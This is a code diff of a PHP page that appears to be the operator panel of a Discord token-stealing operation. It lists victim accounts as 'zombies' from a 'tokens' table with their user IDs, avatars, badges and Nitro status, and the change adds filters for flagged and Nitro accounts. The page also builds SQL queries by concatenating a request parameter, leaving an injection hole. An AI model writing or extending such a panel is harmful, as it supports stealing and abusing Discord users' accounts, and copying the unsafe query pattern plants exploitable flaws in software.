@@ -24,22 +24,25 @@
     <section class="section_zombies">
         <div class="filtre">
             <select onchange="SearchByGrade(this)" id="search_by_badges" name="search_by_badges" class="select-button">
-                <option value="all">Grades: All</option>
-                <option value="256">Grades: Balance</option>
-                <option value="64">Grades: Bravery</option>
-                <option value="128">Grades: Brillance</option>
-                <option value="8">Grades: BugHunter</option>
-                <option value="131072">Grades: Dev</option>
-                <option value="512">Grades: Early</option>
-                <option value="4">Grades: HypeSquad</option>
-                <option value="2">Grades: Partner</option>
-                <option value="1">Grades: Staff</option>
-                <!-- <option value="verified">Grades: Verified</option> -->
-                <option value="nitroboost">Grades: Nitro Boost</option>
-                <option value="nitrocl">Grades: Nitro Classic</option>
+                <option value="None">Default</option>    
+                <option value="all">All</option>
+                <option value="256">Balance</option>
+                <option value="64">Bravery</option>
+                <option value="128">Brillance</option>
+                <option value="8">BugHunter</option>
+                <option value="131072">Dev</option>
+                <option value="512">Early</option>
+                <option value="4">HypeSquad</option>
+                <option value="2">Partner</option>
+                <option value="1">Staff</option>
+                <!-- <option value="verified">Verified</option> -->
+                <option value="1338">Nitro Boost</option>
+                <option value="1337">Nitro Classic</option>
+                <option value="FLAGED">Flaged</option>
+                <option value="NOFLAGED">Not Flaged</option>
             </select>
-            <!-- <input type="text" placeholder="Search Username..." class="select-input" onkeyup="SearchByUsername(this)"> -->
-            <!-- <button class="select-button" onclick="CheckTokens()">Check All Tokens</button> -->
+            <!-- <input type="text" placeholder="Search Username..." class="select-input" id="user_search"> -->
+            <!-- <button class="select-button search-btn" onclick="SearchByUsername()"><i class='bx bx-search-alt-2'></i></button> -->
         </div>
         <div id="zombies" class="zombies">
             <?php
@@ -47,23 +50,28 @@
 
                 if(isset($_GET['badge']) && !empty($_GET['badge'])) {
                     $badge = htmlspecialchars($_GET['badge']);
-                    if($badge == "all") {
-                        $resp = $bdd->query('SELECT * FROM tokens');
-                    } else if ($badge == "nitrocl") {
-                        $resp = $bdd->query('SELECT * FROM tokens WHERE nitro_badges = 1');
-                    } else if ($badge == "nitroboost") {
-                        $resp = $bdd->query('SELECT * FROM tokens WHERE nitro_badges = 2');
-                    } else {
-                        $resp = $bdd->query('SELECT * FROM tokens WHERE badges = ' . $badge);
-                    }
-                    
+                    if($badge != "None") {
+                        if($badge == "all") {
+                            $resp = $bdd->query('SELECT * FROM tokens');
+                        } else if ($badge == "1337") {
+                            $resp = $bdd->query('SELECT * FROM tokens WHERE nitro_badges = 1');
+                        } else if ($badge == "1338") {
+                            $resp = $bdd->query('SELECT * FROM tokens WHERE nitro_badges = 2');
+                        } else if ($badge == "FLAGED") {
+                            $resp = $bdd->query('SELECT * FROM tokens WHERE isflaged = 1');
+                        } else if ($badge == "NOFLAGED") {
+                            $resp = $bdd->query('SELECT * FROM tokens WHERE isflaged = 0');
+                        } else {
+                            $resp = $bdd->query('SELECT * FROM tokens WHERE badges = ' . $badge);
+                        }
+                    }                    
                 } else {
                     $resp = $bdd->query('SELECT * FROM tokens');
                 }
                 
                 while ($user = $resp->fetch()) {
             ?>
-                <div class="zombie">
+                <div class="zombie flaged-<?=strval($user["isflaged"]);?>">
                     <?php
                         if(!empty($user['avatar']) AND $user['avatar'] != null){
                             ?><img class="user_pfp" src="https://cdn.discordapp.com/avatars/<?=$user['user_id']?>/<?=$user['avatar']?>" alt="" srcset=""><?php
@@ -104,7 +112,7 @@
                             }
                         ?>
                     </div>
-                    <a href="token?id=<?=$user['user_id']?>">View All Infos</a>
+                    <a class="edit_token" href="token?id=<?=$user['user_id']?>">View All Infos</a>
                 </div>
 
             <?php
